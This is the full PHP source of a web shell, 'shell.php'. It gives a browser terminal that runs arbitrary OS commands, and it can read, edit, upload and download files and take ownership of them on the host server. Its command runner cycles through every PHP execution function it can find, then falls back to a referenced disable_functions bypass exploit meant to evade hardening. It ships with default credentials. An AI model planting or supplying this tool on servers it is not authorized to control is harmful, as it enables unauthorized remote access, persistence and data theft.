<?php
$users = array('admin'=>'secret_password'); // change this!
$home = realpath('.'); // config

function authenticate($u) {
  if (!isset($_SERVER['PHP_AUTH_USER'])) die(header('WWW-Authenticate: Basic realm="shell.php"',401));
  if (!isset($u[$_SERVER['PHP_AUTH_USER']]) || $u[$_SERVER['PHP_AUTH_USER']]!=$_SERVER['PHP_AUTH_PW']) die();
  if ($_SERVER['PHP_AUTH_PW']=='secret_password') die('change default password in line 2 of shell.php');
}
authenticate($users);

$commands = array('view','edit','upload','download','own');
$style = <<<END_OF_STYLE
body { margin: 8px; font-family:mono; font-size:12px; color: black; }
a{ color: grey; }
a:hover{ color: blue; }
a.copy{ color: black; text-decoration:none; }
END_OF_STYLE;
$microAjax = <<<END_OF_JAVASCRIPT
function microAjax(B,A){this.bindFunction=function(E,D){return function(){return E.apply(D,[D])}};this.stateChange=function(D){if(this.request.readyState==4){this.callbackFunction(this.request.responseText)}};this.getRequest=function(){if(window.ActiveXObject){return new ActiveXObject("Microsoft.XMLHTTP")}else{if(window.XMLHttpRequest){return new XMLHttpRequest()}}return false};this.postBody=(arguments[2]||"");this.callbackFunction=A;this.url=B;this.request=this.getRequest();if(this.request){var C=this.request;C.onreadystatechange=this.bindFunction(this.stateChange,this);if(this.postBody!==""){C.open("POST",B,true);C.setRequestHeader("X-Requested-With","XMLHttpRequest");C.setRequestHeader("Content-type","application/x-www-form-urlencoded");C.setRequestHeader("Connection","close")}else{C.open("GET",B,true)}C.send(this.postBody)}};
END_OF_JAVASCRIPT;

function bash()
{ global $home;
  global $a;
  global $commands;
  global $style;
  global $microAjax;
  if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') die('Windows not supported');
  $jsonCommands = json_encode($commands);
  $suggestions = links(array('cd \'~\''=>'cd \'~\'','upload'=>'upload'));
  $processUser = posix_getpwuid(posix_geteuid());
  $prompt = '<span id="prompt">'.$processUser['name'].'@'.php_uname('n').':<span id="dir">~</span>$ </span>';
  echo <<<END_OF_HTML
<html><head>
<style>
$style
</style>
<script type="text/javascript">
$microAjax
var ls = 'ls -al';
function focus()
{ document.forms[0].elements[0].focus();
  window.scrollTo(0,document.forms[0].elements[0].offsetTop);  
}
function ondata(str)
{ var command = document.forms[0].elements[0].value;
  eval('var data = '+str);
  text = data.output;
  var newText = document.createElement('span');
  newText.innerHTML = text;
  var history = document.getElementById('history');
  var iscd = text.split("\\n")[0].indexOf('\$ cd ')>=0;
  if (iscd) history.innerHTML="";
  history.appendChild(newText);
  document.getElementById('dir').innerHTML=data.dir;
  document.forms[0].elements[0].value = "";
  focus();
  if (iscd)
  { document.forms[0].elements[0].value = ls;
    onenter();
  }
}
function activate(a)
{ document.forms[0].elements[0].value = a.title;
  onenter();
  return false;
}
function copy(a)
{ var s = document.forms[0].elements[0].value;
  if (s.length && s.substr(s.length-1,1)!=' ') s+=' ';
  document.forms[0].elements[0].value = s+a.title+' ';
  return false;
}
function onenter()
{ var command = document.forms[0].elements[0].value;
  if (command.substr(0,4)=='ls -') ls = command;
  var dir = document.getElementById('dir').innerHTML;
  var real = dir.replace(/^~/,'$home');
  var commands = $jsonCommands;
  if (command=='clear' || command=='exit') 
  { document.getElementById('history').innerHTML="";
    document.forms[0].elements[0].value = "";
    return false;
  }
  for (var c in commands)
  { c = commands[c];
    var entered = command.substr(0,c.length+1)
    if (entered==c || entered==c+' ')
    { var newText = document.createElement('span');
      var prompt = document.getElementById('prompt');
      newText.innerHTML = (prompt.textContent||prompt.innerText)+command+"\\n";
      var history = document.getElementById('history');
      history.appendChild(newText);
      document.forms[0].elements[0].value = "";
      var application = encodeURIComponent(c);
      var argument = command.substr(c.length+1);
      argument = argument.replace(/^('(.*)')|([^'].*)$/,'$2$3');
      argument = encodeURIComponent(argument);
      real = encodeURIComponent(real);
      document.location = '?application='+application+'&directory='+real+'&argument='+argument;
      return false;
    }
  }
  command = encodeURIComponent(command);
  dir = encodeURIComponent(dir);
  microAjax('?application=command&command='+command+'&dir='+dir, ondata);
  return false;
}
document.onkeypress = function doSomething(e) {
	var code;
	if (!e) var e = window.event;
	if (e.target==document.forms[0].elements[0]) return;
	if (e.keyCode) code = e.keyCode;
	else if (e.which) code = e.which;
	var character = String.fromCharCode(code);
	document.forms[0].elements[0].value+=character;
	focus();
}
</script></head><body style="margin:8px;" onload="document.forms[0].elements[0].value = ls; onenter();">
<pre id="history" style="display:inline;padding:0;margin:0;">
</pre><pre style="display:inline;padding:0;margin:0;">
<form style="display:inline; padding:0; margin:0;" onsubmit="return onenter();">$prompt<input style="font-family:mono; font-size:12px; color: black; padding:0; margin:0; border:0; width:40em;" type="text" name="command" autocomplete="off"\></form>
<div>$suggestions</div>
</body></html>
END_OF_HTML;
}

function expand($home,$dir,$path)
{ preg_match('/^(~?)(\/?)(.*)$/',$path,$matches);
  if ($matches[1]) @$newdir = $home.$matches[2].$matches[3];
  else if ($matches[2]) @$newdir = $matches[2].$matches[3];
  else @$newdir = $dir.'/'.$matches[3];
  if (file_exists($newdir)) return realpath($newdir);
  return $newdir;
}

function alt_stat($file)
{ clearstatcache();
  $ss=@stat($file);
  if(!$ss) return false; //Couldnt stat file

  $ts=array(
  0140000=>'ssocket',
  0120000=>'llink',
  0100000=>'-file',
  0060000=>'bblock',
  0040000=>'ddir',
  0020000=>'cchar',
  0010000=>'pfifo',
  );

  $p=$ss['mode'];
  $t=decoct($ss['mode'] & 0170000); // File Encoding Bit

  $str =(array_key_exists(octdec($t),$ts))?$ts[octdec($t)]{0}:'u';
  $str.=(($p&0x0100)?'r':'-').(($p&0x0080)?'w':'-');
  $str.=(($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-'));
  $str.=(($p&0x0020)?'r':'-').(($p&0x0010)?'w':'-');
  $str.=(($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-'));
  $str.=(($p&0x0004)?'r':'-').(($p&0x0002)?'w':'-');
  $str.=(($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));

  $type = substr($ts[octdec($t)],1);
  $owner = posix_getpwuid($ss['uid']);
  $group = posix_getgrgid($ss['gid']);

  $s=array(
  'human'=>$str,
  'owner'=>$owner['name'],
  'group'=>$group['name'],
  'realpath'=>@realpath($file),
  'dirname'=>@dirname($file),
  'basename'=>@basename($file),
  'type'=>$type,
  'type_octal'=>sprintf("%07o", octdec($t)),
  'is_file'=>@is_file($file),
  'is_dir'=>@is_dir($file),
  'is_link'=>@is_link($file),
  'is_readable'=> @is_readable($file),
  'is_writable'=> @is_writable($file),
  'device'=>$ss['dev'], //Device
  'device_number'=>$ss['rdev'], //Device number, if device.
  'inode'=>$ss['ino'], //File serial number
  'link_count'=>$ss['nlink'], //link count
  'link_to'=>($type=='link') ? @readlink($file) : '',
  'size'=>$ss['size'], //Size of file, in bytes.
  'blocks'=>$ss['blocks'], //Number 512-byte blocks allocated
  'block_size'=> $ss['blksize'], //Optimal block size for I/O.
  'accessed'=>@date('Y-m-d H:i',$ss['atime']),
  'modified'=>@date('Y-m-d H:i',$ss['mtime']),
  'created'=>@date('Y-m-d H:i',$ss['ctime']),
  );

  clearstatcache();
  return $s;
}

function links($commands)
{ $output = '';
  foreach ($commands as $text=>$href)
  { $h = addslashes($href);
    if ($text=='rm') $output.= "<a href=\"#\" title=\"$href\" onclick=\"if (confirm('You are about to:\\n\\n$h\\n\\nAre you sure?')) activate(this); return false\">$text</a> ";
    else $output.= "<a href=\"#\" title=\"$href\" onclick=\"return activate(this);\">$text</a> ";
  }
  return $output;
}

function action($sdir,$s)
{ $commands = array();
  $user = posix_getpwuid(posix_getuid());
  $username = $user['name'];
  if ($s['is_dir'])
  { $b = escapeshellarg($s['basename']);
    if ($s['is_readable'])
    { $commands['cd'] = "cd $b";
    }
    if ($s['is_writable'])
    { if ($s['basename']=='.')
      { $r = escapeshellarg(basename($s['realpath'].'_'.date('YmdHi').'.zip'));
        $d = escapeshellarg('.');
        $commands['zip'] = "zip -r $r $d";
      }
      if ($s['basename']!='.' && $s['basename']!='..')
      { $commands['rm'] = "rm -R $b";
      }
    }
  }
  else if ($s['is_file'])
  { $t = escapeshellarg($s['basename'].'.tmp');
    $b = escapeshellarg($s['basename']);
    if ($s['is_readable'])
    { $commands['view'] = "view $b";
      $commands['download'] = "download $b";
    }
    if ($s['is_writable'])
    { $commands['edit'] = "edit $b";
    }
    if ($sdir['is_writable'])
    { if ($s['owner']!=$username)
      { $commands['own'] = "mv $b $t; cp $t $b; rm $t";
      }
      $commands['rm'] = "rm $b";
      if (preg_match('/^(.*)\.zip$/',$s['basename'],$matches))
      { $d = escapeshellarg($matches[1]);
        $commands['unzip'] = "unzip $b -d $d";
      }
    }
  }
  return links($commands);
}

function ls($flags,$dir)
{ $files = scandir($dir);
  $data = array();
  $all = strpos($flags,'a')!==false;
  if (strpos($flags,'l')===false) $columns = array('basename'=>'l','action'=>'');
  else $columns = array('human'=>'l','link_count'=>'r','owner'=>'l','group'=>'l','size'=>'r','modified'=>'l','basename'=>'l','action'=>'');
  foreach (array_keys($columns) as $column) $data[$column] = array();
  $sdir = alt_stat($dir);
  foreach($files as $file) 
  { if (substr($file,0,1)=='.' && !$all) continue;
    $s = alt_stat($dir.'/'.$file);
    foreach ($columns as $column=>$align)
    { if ($column != 'action') $data[$column][] = $s[$column];
      else $data[$column][] = action($sdir,$s);
    }
  }
  $output='';
  $lengths = array();
  foreach ($columns as $column=>$align)
  { $length[$column]=0;
    foreach ($data[$column] as $s)
    { $length[$column]=max($length[$column],strlen($s));
    }
  }
  $rmax = count($data[$column]);
  for ($r=0;$r<$rmax;$r++)
  { foreach ($columns as $column=>$align)
    { $d = $data[$column][$r];
      if ($align=='l') $d = str_pad($d, $length[$column], " ", STR_PAD_RIGHT);
      if ($align=='r') $d = str_pad($d, $length[$column], " ", STR_PAD_LEFT);
      if ($align=='c') $d = str_pad($d, $length[$column], " ", STR_PAD_BOTH);
      if ($column=='basename') $output.= '<a href="#" class="copy" onclick="return copy(this);" title="'.escapeshellarg($data[$column][$r]).'">'.$d.'</a> ';
      else $output.= $d.' ';
    }
    $output.= "\n";
  }
  return $output;
}

function command()
{ global $home;
  $command = false;
  $dir = $home;
  $output = false;
  $processUser = posix_getpwuid(posix_geteuid());
  $prompt = '<span id="prompt">'.$processUser['name'].'@'.php_uname('n').':<span id="dir">~</span>$ </span>';
  if (isset($_GET['command'])) $command = $_GET['command'];
  if (isset($_GET['dir'])) $dir = $_GET['dir'];
  $olddir = $dir;
  if (substr($dir,0,1)=='~') $dir = $home.substr($dir,1);
  header('Content-Type: text/plain');
  $output = '';
  if (preg_match('/^cd (.*)$/',trim($command),$matches))
  { $argument = $matches[1];
    $real = false;
    if (preg_match('/^\'(.*)\'|([^\'].*)$/',$argument,$matches))
    { if (isset($matches[1])) $argument = $matches[1];
      if (isset($matches[2])) $argument = $matches[2];
      $real = expand($home,$dir,$argument);
    }
    if (!$argument || !$real || !file_exists($real))
    { $output.="bash: $command: No such file or directory\n";
    }
    else if (!is_readable($real))
    { $output.="bash: $command: can't cd to directory\n";
    }
    else
    { $dir = $real;
    }
  }
  else if (preg_match('/^ls( -[a-zA-Z0-9]+)?( \'(.+)\')?/',$command,$matches))
  { $flags = '';
    if (isset($matches[1])) $flags = substr($matches[1],2);
    if (isset($matches[2])) $real = expand($home,$dir,$matches[3]);
    else $real = realpath($dir);
    if (!file_exists($real))
    { $output.="bash: $command($real): No such file or directory\n";
    }
    else
    { $output.=ls($flags,$real);
    }
  }
  else
  { chdir($dir);
    $output=myshellexec($command." 2>&1");
  }
  if (substr($dir,0,strlen($home))==$home) $dir = '~'.substr($dir,strlen($home));
  $output = $processUser['name'].'@'.php_uname('n').':'.$olddir.'$ '.$command."\n".$output;
  echo json_encode(array('dir'=>$dir,'output'=>$output));
}

function myshellexec($cfe)
{ $res = '';
  if (!empty($cfe))
  { if(@function_exists('passthru'))
    { @ob_start();
      @passthru($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    }
    elseif(@function_exists('exec'))
    { @exec($cfe,$res);
      $res = join("\n",$res);
    }
    elseif(@function_exists('shell_exec'))
    { $res = @shell_exec($cfe);
    }
    elseif(@function_exists('system'))
    { @ob_start();
      @system($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    }
    elseif(@is_resource($f = @popen($cfe,"r")))
    { $res = "";
      if (@function_exists('fread') &&@function_exists('feof'))
      { while(!@feof($f)) {$res .= @fread($f,1024);}
      }
      elseif(@function_exists('fgets') &&@function_exists('feof'))
      { while(!@feof($f)) {$res .= @fgets($f,1024);}
      }
      @pclose($f);
    }
    elseif(@is_resource($f = @proc_open($cfe,array(1 =>array("pipe","w")),$pipes)))
    { $res = "";
      if(@function_exists('fread') &&@function_exists('feof'))
      { while(!@feof($pipes[1])) {$res .= @fread($pipes[1],1024);}
      }
      elseif(@function_exists('fgets') &&@function_exists('feof'))
      { while(!@feof($pipes[1])) {$res .= @fgets($pipes[1],1024);}
      }
      @proc_close($f);
    }
    // see: https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php
    elseif(@function_exists('pwn'))
    { @ob_start();
      pwn($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    }
  }
  return $res;
}

function view()
{ global $home;
  if (!isset($_GET['directory'])) error_exit(false,'no directory specified');
  if (!isset($_GET['argument'])) error_exit(false,'no argument specified');
  $directory = $_GET['directory'];
  $argument = $_GET['argument'];
  $file = expand($home,$directory,$argument);
  $basename = basename($file);
  if (!file_exists($file)) error_exit(false,'cannot find file');
  if (!is_file($file)) error_exit(false,'argument must be a file');
  $content = file_get_contents($file);
  if (strpos($content,"\0")===false)
  { header('Content-Type: text/plain');
    echo $content;
  }
  else if ($size = getimagesize($file))
  { header('Content-Type: '.$size['mime']);
    echo $content;
  }
  else
  { header("Pragma: public"); // required
    header("Expires: 0");
    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
    header("Cache-Control: private",false); // required for certain browsers
    header("Content-Type: ".mime_content_type($basename));
    header("Content-Disposition: attachment; filename=\"$basename\"");
    header("Content-Transfer-Encoding: binary");
    header("Content-Length: ".strlen($content));
    ob_clean();
    flush();
    echo $content;
  }
}

function download()
{ global $home;
  if (!isset($_GET['directory'])) error_exit(false,'no directory specified');
  if (!isset($_GET['argument'])) error_exit(false,'no argument specified');
  $directory = $_GET['directory'];
  $argument = $_GET['argument'];
  $file = expand($home,$directory,$argument);
  $basename = basename($file);
  if (!file_exists($file)) error_exit(false,'cannot find file');
  header("Pragma: public"); // required
  header("Expires: 0");
  header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
  header("Cache-Control: private",false); // required for certain browsers
  header("Content-Type: ".mime_content_type($basename));
  header("Content-Disposition: attachment; filename=\"$basename\"");
  header("Content-Transfer-Encoding: binary");
  header("Content-Length: ".filesize($file));
  ob_clean();
  flush();
  readfile($file);
}

function edit()
{ global $home;
  global $style;
  global $microAjax;
  if (!isset($_GET['directory'])) error_exit(false,'no directory specified');
  if (!isset($_GET['argument'])) error_exit(false,'no argument specified');
  $directory = $_GET['directory'];
  $argument = $_GET['argument'];
  $file = expand($home,$directory,$argument);
  $basename = basename($file);
  if (!file_exists($file)) error_exit(false,'cannot find file');
  if (!is_file($file)) error_exit(false,'argument must be a file');
  if (isset($_POST['text']))
  { $text = $_POST['text'];
    if (file_put_contents($file,$text)) die('file saved');
    else die('save failed');
  }
  $content = file_get_contents($file);
  if (strpos($content,"\0")!==false) error_exit(false,'binary file detected');
  $content = json_encode($content);
  echo <<<END_OF_HTML
<html><head>
<style>
$style
</style>
<script type="text/javascript">
var content = $content;
$microAjax
function focus()
{ document.forms[0].elements[0].focus();
}
function ondata(str)
{ history.go(-1);
}
function activate(a)
{ var text = document.forms[0].elements[0].value;
  text = encodeURIComponent(text);
  microAjax(document.location.href, ondata,'text='+text);
  return false;
}
document.onclick = focus;
</script>
</head>
<body onload="document.forms[0].elements[0].value=content;document.forms[0].elements[0].style.display='block';"><form style="display:inline;"><textarea style="resize:none;border:0;display:none;width:100%;height:100%;color:black;"></textarea><div style="position:absolute; top:0; right:0;"><div style="margin: 8px; padding: 5px; border:1px solid silver; background: white;"><span id="basename"><a href="#" title="save" onclick="return activate(this)">save</a></div></div></form>
</body></html>
END_OF_HTML;
}

function error_exit($success,$message)
{ global $style;
  $result = $success?'SUCCEEDED':'FAILED';
  $back = isset($_POST['overwrite'])?2:1;
  echo <<<END_OF_HTML
<html><head><style>$style</style></head><body><pre>
$result: $message

<button onclick="history.go(-$back);">ok</button></pre></body></html>
END_OF_HTML;
  exit;
}

function upload()
{ global $home;
  global $style;
  if (!isset($_GET['directory'])) error_exit(false,'no directory specified');
  $directory = $_GET['directory'];
  if (!is_writable($directory)) error_exit(false,'target directory not writable');
  if (isset($_POST['overwrite']))
  { $overwrite = $_POST['overwrite']=='yes';
    $error = $_FILES["file"]["error"];
    if ($error > 0) 
    { switch($error)
      { case 1: error_exit(false,'file exceeds the upload_max_filesize');
        case 2: error_exit(false,'file exceeds the MAX_FILE_SIZE');
        case 3: error_exit(false,'file was only partially uploaded');
        case 4: error_exit(false,'no file was uploaded');
        case 5: error_exit(false,'missing a temporary folder');
        case 6: error_exit(false,'no file was uploaded');
        case 7: error_exit(false,'failed to write file to disk');
        case 8: error_exit(false,'file upload stopped by extension');
        default: error_exit(false,'upload failed');
      }
    }
    $basename = $_FILES["file"]["name"];
    $file = expand($home,$directory,$basename);
    if (file_exists($file) && !$overwrite) error_exit(false,'file already exists');
    $tmp = $_FILES["file"]["tmp_name"];
    if (!move_uploaded_file($tmp,$file)) error_exit(false,'file cannot be moved');
    error_exit(true,'file uploaded');
  }
  echo <<<END_OF_HTML
<html><head><style>$style</style></head><body>
<pre><form method="post" enctype="multipart/form-data" style="display:inline;"><label for="target">target directory:</label>
<input name="target" type="text" value="$directory/" disabled="disabled" size="40"/>

<label for="file">file to upload:</label>
<input name="file" type="file"/>

<label for="overwrite">overwrite if file exists?</label>
<input name="overwrite" type="radio" value="yes"/> yes
<input name="overwrite" type="radio" value="no" checked="checked"/> no

<input type="submit" value="ok"/>

</form></pre>
</body></html>
END_OF_HTML;
  exit;
}

$application = 'bash';
$applications = array_merge($commands,array());
$applications[] = 'bash';
$applications[] = 'command';
if (isset($_GET['application'])) $application = $_GET['application'];
if (in_array($application,$applications)) call_user_func($application);

